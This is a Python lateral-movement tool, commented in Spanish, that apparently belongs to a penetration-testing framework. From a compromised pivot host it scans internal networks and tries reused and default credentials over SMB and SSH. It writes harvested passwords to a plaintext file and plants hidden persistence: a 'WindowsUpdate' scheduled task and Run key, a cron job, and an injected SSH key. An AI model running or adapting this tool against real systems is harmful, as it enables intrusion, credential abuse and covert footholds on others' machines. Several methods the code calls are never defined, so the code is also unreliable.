#!/usr/bin/env python3

import json
import subprocess
import threading
import time
import os
import ipaddress
from concurrent.futures import ThreadPoolExecutor
import socket
import random

class LateralMovement:
    def __init__(self, config_file="config/lateral-config.json"):
        with open(config_file, 'r') as f:
            self.config = json.load(f)
        
        self.compromised_hosts = []
        self.discovered_hosts = []
        self.attempted_targets = []
        self.successful_movements = []
        self.credentials_database = []
        
        self.results = {
            "lateral_movements": [],
            "credential_reuse": [],
            "new_compromises": [],
            "failed_attempts": [],
            "network_mapping": [],
            "persistence_established": []
        }
        
        self.base_dir = "/opt/pentest"
        self.temp_dir = f"{self.base_dir}/temp"
    
    def execute_lateral_movement(self, pivot_host, credentials, discovered_networks=None):
        """Ejecutar movimiento lateral desde un host comprometido"""
        print(f"[+] Iniciando movimiento lateral desde {pivot_host}")
        
        # Cargar credenciales existentes
        self.load_credentials_database()
        
        # Agregar nuevas credenciales
        if credentials:
            self.add_credentials(credentials, pivot_host)
        
        # Descubrir objetivos en la red local
        local_targets = self.discover_local_targets(pivot_host, credentials)
        
        # Descubrir objetivos en redes adicionales
        if discovered_networks:
            network_targets = self.discover_network_targets(discovered_networks, pivot_host)
            local_targets.extend(network_targets)
        
        # Intentar movimiento lateral a cada objetivo
        self.attempt_lateral_movements(pivot_host, local_targets, credentials)
        
        # Establecer persistencia en nuevos hosts
        self.establish_persistence_on_new_hosts()
        
        return self.results
    
    def discover_local_targets(self, pivot_host, credentials):
        """Descubrir objetivos en la red local"""
        print(f"[+] Descubriendo objetivos locales desde {pivot_host}")
        
        targets = []
        
        # Obtener red local del host pivot
        local_networks = self.get_local_networks(pivot_host, credentials)
        
        for network in local_networks:
            print(f"[+] Escaneando red {network}")
            network_targets = self.scan_network_for_targets(network, pivot_host, credentials)
            targets.extend(network_targets)
        
        # Eliminar el host pivot de la lista
        targets = [t for t in targets if t["ip"] != pivot_host]
        
        print(f"[+] Encontrados {len(targets)} objetivos potenciales")
        return targets
    
    def get_local_networks(self, pivot_host, credentials):
        """Obtener redes locales del host pivot"""
        networks = []
        
        # Comandos para obtener información de red
        if credentials.get("os_type", "").lower() == "windows":
            cmd = "ipconfig /all"
        else:
            cmd = "ip route show"
        
        result = self.execute_remote_command(pivot_host, cmd, credentials)
        
        if result:
            # Parsear redes desde la salida
            networks = self.parse_network_info(result, credentials.get("os_type", "linux"))
        
        return networks
    
    def parse_network_info(self, output, os_type):
        """Parsear información de red"""
        networks = []
        
        if os_type.lower() == "windows":
            # Parsear ipconfig output
            lines = output.split('\n')
            for i, line in enumerate(lines):
                if "IPv4 Address" in line:
                    ip_match = line.split(":")[-1].strip()
                    # Buscar subnet mask en líneas siguientes
                    for j in range(i+1, min(i+5, len(lines))):
                        if "Subnet Mask" in lines[j]:
                            mask = lines[j].split(":")[-1].strip()
                            try:
                                # Convertir a CIDR
                                cidr = sum([bin(int(x)).count('1') for x in mask.split('.')])
                                network = ipaddress.IPv4Network(f"{ip_match}/{cidr}", strict=False)
                                networks.append(str(network))
                            except:
                                pass
                            break
        else:
            # Parsear ip route output
            import re
            network_pattern = r'(\d+\.\d+\.\d+\.\d+/\d+)'
            matches = re.findall(network_pattern, output)
            for match in matches:
                try:
                    network = ipaddress.IPv4Network(match, strict=False)
                    if not network.is_loopback and not network.is_link_local:
                        networks.append(str(network))
                except:
                    pass
        
        return list(set(networks))  # Eliminar duplicados
    
    def scan_network_for_targets(self, network, pivot_host, credentials):
        """Escanear red para encontrar objetivos"""
        targets = []
        
        try:
            net = ipaddress.IPv4Network(network)
            
            # Limitar escaneo para redes grandes
            if net.num_addresses > 256:
                host_list = list(net.hosts())[:100]  # Solo primeros 100
            else:
                host_list = list(net.hosts())
            
            # Ping sweep desde el host pivot
            alive_hosts = self.ping_sweep_via_pivot(host_list, pivot_host, credentials)
            
            # Port scan de hosts vivos
            for host_ip in alive_hosts:
                target_info = self.basic_port_scan_via_pivot(str(host_ip), pivot_host, credentials)
                if target_info:
                    targets.append(target_info)
        
        except Exception as e:
            print(f"[-] Error escaneando red {network}: {e}")
        
        return targets
    
    def ping_sweep_via_pivot(self, host_list, pivot_host, credentials):
        """Ping sweep a través del host pivot"""
        alive_hosts = []
        
        # Preparar comando de ping según OS
        if credentials.get("os_type", "").lower() == "windows":
            ping_cmd_template = "ping -n 1 -w 1000 {}"
        else:
            ping_cmd_template = "ping -c 1 -W 1 {}"
        
        # Ejecutar ping en paralelo (limitado)
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            
            for host in host_list:
                ping_cmd = ping_cmd_template.format(str(host))
                future = executor.submit(self.execute_remote_command, pivot_host, ping_cmd, credentials)
                futures.append((host, future))
            
            for host, future in futures:
                try:
                    result = future.result(timeout=10)
                    if result and ("bytes=" in result or "64 bytes" in result):
                        alive_hosts.append(host)
                        print(f"[+] Host vivo: {host}")
                except:
                    pass
        
        return alive_hosts
    
    def basic_port_scan_via_pivot(self, target_ip, pivot_host, credentials):
        """Port scan básico a través del pivot"""
        target_info = {
            "ip": target_ip,
            "open_ports": [],
            "services": {},
            "os_guess": "unknown"
        }
        
        # Puertos comunes para movimiento lateral
        common_ports = [22, 23, 53, 80, 135, 139, 389, 443, 445, 993, 995, 3389, 5985, 5986]
        
        # Scan usando netcat desde el pivot
        for port in common_ports:
            if credentials.get("os_type", "").lower() == "windows":
                scan_cmd = f"powershell Test-NetConnection -ComputerName {target_ip} -Port {port} -InformationLevel Quiet"
            else:
                scan_cmd = f"nc -zv {target_ip} {port}"
            
            result = self.execute_remote_command(pivot_host, scan_cmd, credentials)
            
            if result and ("open" in result.lower() or "true" in result.lower()):
                target_info["open_ports"].append(port)
                target_info["services"][port] = self.guess_service(port)
                print(f"[+] Puerto abierto en {target_ip}:{port}")
        
        # Guess OS based on open ports
        if 3389 in target_info["open_ports"] or 5985 in target_info["open_ports"]:
            target_info["os_guess"] = "windows"
        elif 22 in target_info["open_ports"]:
            target_info["os_guess"] = "linux"
        
        return target_info if target_info["open_ports"] else None
    
    def guess_service(self, port):
        """Adivinar servicio por puerto"""
        port_services = {
            22: "ssh", 23: "telnet", 53: "dns", 80: "http", 135: "rpc",
            139: "netbios", 389: "ldap", 443: "https", 445: "smb",
            993: "imaps", 995: "pop3s", 3389: "rdp", 5985: "winrm", 5986: "winrm-ssl"
        }
        return port_services.get(port, "unknown")
    
    def attempt_lateral_movements(self, pivot_host, targets, pivot_credentials):
        """Intentar movimiento lateral a objetivos"""
        print(f"[+] Intentando movimiento lateral a {len(targets)} objetivos")
        
        for target in targets:
            target_ip = target["ip"]
            open_ports = target["open_ports"]
            os_guess = target["os_guess"]
            
            print(f"[+] Intentando acceso a {target_ip}")
            
            # Intentar diferentes métodos según puertos abiertos
            success = False
            
            if 445 in open_ports:  # SMB
                success = self.attempt_smb_lateral_movement(pivot_host, target_ip, pivot_credentials)
            
            if not success and 5985 in open_ports:  # WinRM
                success = self.attempt_winrm_lateral_movement(pivot_host, target_ip, pivot_credentials)
            
            if not success and 22 in open_ports:  # SSH
                success = self.attempt_ssh_lateral_movement(pivot_host, target_ip, pivot_credentials)
            
            if not success and 3389 in open_ports:  # RDP
                success = self.attempt_rdp_lateral_movement(pivot_host, target_ip, pivot_credentials)
            
            if not success:
                # Intentar ataques de credenciales por defecto
                success = self.attempt_default_credentials(pivot_host, target_ip, open_ports, os_guess)
            
            # Registrar resultado
            if success:
                self.results["new_compromises"].append({
                    "target_ip": target_ip,
                    "pivot_host": pivot_host,
                    "method": success["method"],
                    "credentials": success["credentials"],
                    "timestamp": time.time()
                })
                self.successful_movements.append(target_ip)
            else:
                self.results["failed_attempts"].append({
                    "target_ip": target_ip,
                    "pivot_host": pivot_host,
                    "attempted_methods": ["smb", "winrm", "ssh", "rdp"],
                    "timestamp": time.time()
                })
    
    def attempt_smb_lateral_movement(self, pivot_host, target_ip, credentials):
        """Intentar movimiento lateral via SMB"""
        print(f"[+] Intentando SMB lateral movement a {target_ip}")
        
        # Intentar con credenciales del pivot
        smb_creds = [
            {"username": credentials.get("username", ""), "password": credentials.get("password", "")},
            {"username": "administrator", "password": credentials.get("password", "")},
            {"username": credentials.get("username", ""), "password": ""},
        ]
        
        for cred in smb_creds:
            if self.test_smb_access(pivot_host, target_ip, cred):
                return {
                    "method": "smb",
                    "credentials": cred
                }
        
        return False
    
    def attempt_ssh_lateral_movement(self, pivot_host, target_ip, credentials):
        """Intentar movimiento lateral via SSH"""
        print(f"[+] Intentando SSH lateral movement a {target_ip}")
        
        # Intentar con credenciales del pivot
        ssh_creds = [
            {"username": credentials.get("username", "root"), "password": credentials.get("password", "")},
            {"username": "root", "password": credentials.get("password", "")},
            {"username": credentials.get("username", "root"), "password": ""},
        ]
        
        for cred in ssh_creds:
            if self.test_ssh_access(pivot_host, target_ip, cred):
                return {
                    "method": "ssh", 
                    "credentials": cred
                }
        
        return False
    
    def test_smb_access(self, pivot_host, target_ip, credentials):
        """Probar acceso SMB"""
        username = credentials["username"]
        password = credentials["password"]
        
        if credentials.get("os_type", "").lower() == "windows":
            test_cmd = f"net use \\\\{target_ip}\\C$ /user:{username} {password}"
        else:
            test_cmd = f"smbclient -L {target_ip} -U {username}%{password}"
        
        result = self.execute_remote_command(pivot_host, test_cmd, credentials)
        
        return result and "error" not in result.lower() and "failed" not in result.lower()
    
    def test_ssh_access(self, pivot_host, target_ip, credentials):
        """Probar acceso SSH"""
        username = credentials["username"]
        password = credentials["password"]
        
        test_cmd = f"sshpass -p '{password}' ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no {username}@{target_ip} 'echo success'"
        
        result = self.execute_remote_command(pivot_host, test_cmd, credentials)
        
        return result and "success" in result
    
    def attempt_default_credentials(self, pivot_host, target_ip, open_ports, os_guess):
        """Intentar credenciales por defecto"""
        print(f"[+] Intentando credenciales por defecto en {target_ip}")
        
        default_creds = self.config.get("default_credentials", [])
        
        # Filtrar credenciales por OS
        if os_guess == "windows":
            creds_to_try = [c for c in default_creds if c.get("os", "").lower() == "windows"]
        elif os_guess == "linux":
            creds_to_try = [c for c in default_creds if c.get("os", "").lower() == "linux"]
        else:
            creds_to_try = default_creds
        
        for cred in creds_to_try:
            # Intentar según puertos disponibles
            if 445 in open_ports and self.test_smb_access(pivot_host, target_ip, cred):
                return {"method": "smb_default", "credentials": cred}
            elif 22 in open_ports and self.test_ssh_access(pivot_host, target_ip, cred):
                return {"method": "ssh_default", "credentials": cred}
        
        return False
    
    def execute_remote_command(self, target_ip, command, credentials):
        """Ejecutar comando remoto"""
        try:
            access_method = credentials.get("access_method", "ssh")
            username = credentials.get("username", "root")
            password = credentials.get("password", "")
            
            if access_method == "ssh":
                ssh_cmd = f"sshpass -p '{password}' ssh -o ConnectTimeout=10 -o StrictHostKeyChecking=no {username}@{target_ip} '{command}'"
                result = subprocess.run(ssh_cmd, shell=True, capture_output=True, text=True, timeout=30)
                return result.stdout if result.returncode == 0 else None
                
            elif access_method == "winrm":
                winrm_cmd = f"evil-winrm -i {target_ip} -u {username} -p '{password}' -e '{command}'"
                result = subprocess.run(winrm_cmd, shell=True, capture_output=True, text=True, timeout=30)
                return result.stdout if result.returncode == 0 else None
        
        except Exception as e:
            print(f"[-] Error ejecutando comando remoto: {e}")
        
        return None
    
    def establish_persistence_on_new_hosts(self):
        """Establecer persistencia en nuevos hosts comprometidos"""
        print("[+] Estableciendo persistencia en nuevos hosts...")
        
        for compromise in self.results["new_compromises"]:
            target_ip = compromise["target_ip"]
            method = compromise["method"]
            credentials = compromise["credentials"]
            
            print(f"[+] Estableciendo persistencia en {target_ip}")
            
            if "smb" in method or "winrm" in method:
                self.establish_windows_persistence(target_ip, credentials)
            elif "ssh" in method:
                self.establish_linux_persistence(target_ip, credentials)
    
    def establish_windows_persistence(self, target_ip, credentials):
        """Establecer persistencia en Windows"""
        persistence_methods = [
            "schtasks /create /tn 'WindowsUpdate' /tr 'cmd.exe /c powershell.exe' /sc onlogon",
            "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d 'cmd.exe /c powershell.exe'"
        ]
        
        for cmd in persistence_methods:
            try:
                result = self.execute_remote_command(target_ip, cmd, credentials)
                if result:
                    self.results["persistence_established"].append({
                        "target_ip": target_ip,
                        "method": "windows_registry",
                        "command": cmd,
                        "timestamp": time.time()
                    })
                    break
            except:
                continue
    
    def establish_linux_persistence(self, target_ip, credentials):
        """Establecer persistencia en Linux"""
        persistence_methods = [
            "echo '* * * * * /bin/bash -c \"/bin/bash\"' | crontab -",
            "echo 'ssh-rsa AAAAB3NzaC1...' >> ~/.ssh/authorized_keys"
        ]
        
        for cmd in persistence_methods:
            try:
                result = self.execute_remote_command(target_ip, cmd, credentials)
                if result is not None:  # Comando ejecutado (exitoso o no)
                    self.results["persistence_established"].append({
                        "target_ip": target_ip,
                        "method": "linux_cron",
                        "command": cmd,
                        "timestamp": time.time()
                    })
                    break
            except:
                continue
    
    def load_credentials_database(self):
        """Cargar base de datos de credenciales"""
        creds_file = f"{self.temp_dir}/credentials_db.json"
        if os.path.exists(creds_file):
            with open(creds_file, 'r') as f:
                self.credentials_database = json.load(f)
    
    def add_credentials(self, credentials, source_host):
        """Agregar credenciales a la base de datos"""
        cred_entry = {
            "username": credentials.get("username"),
            "password": credentials.get("password"),
            "source_host": source_host,
            "timestamp": time.time()
        }
        
        self.credentials_database.append(cred_entry)
        
        # Guardar base de datos actualizada
        creds_file = f"{self.temp_dir}/credentials_db.json"
        with open(creds_file, 'w') as f:
            json.dump(self.credentials_database, f, indent=2)
    
    def save_results(self, pivot_host):
        """Guardar resultados del movimiento lateral"""
        output_file = f"{self.temp_dir}/lateral_movement_{pivot_host.replace('.', '_')}.json"
        with open(output_file, 'w') as f:
            json.dump(self.results, f, indent=2)
        
        print(f"[+] Resultados guardados en {output_file}")
        self.print_summary()
    
    def print_summary(self):
        """Imprimir resumen del movimiento lateral"""
        print("\n" + "="*60)
        print("RESUMEN DE MOVIMIENTO LATERAL")
        print("="*60)
        print(f"Nuevos compromisos: {len(self.results['new_compromises'])}")
        print(f"Intentos fallidos: {len(self.results['failed_attempts'])}")
        print(f"Persistencia establecida: {len(self.results['persistence_established'])}")
        
        if self.results["new_compromises"]:
            print("\nNuevos hosts comprometidos:")
            for compromise in self.results["new_compromises"]:
                print(f"  - {compromise['target_ip']} via {compromise['method']}")
        
        print("="*60)

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 3:
        print("Uso: python3 lateral-movement.py <pivot_host> <credentials_file> [networks_file]")
        sys.exit(1)
    
    pivot_host = sys.argv[1]
    creds_file = sys.argv[2]
    networks_file = sys.argv[3] if len(sys.argv) > 3 else None
    
    with open(creds_file, 'r') as f:
        credentials = json.load(f)
    
    discovered_networks = None
    if networks_file and os.path.exists(networks_file):
        with open(networks_file, 'r') as f:
            discovered_networks = json.load(f)
    
    lateral = LateralMovement()
    results = lateral.execute_lateral_movement(pivot_host, credentials, discovered_networks)
    lateral.save_results(pivot_host)
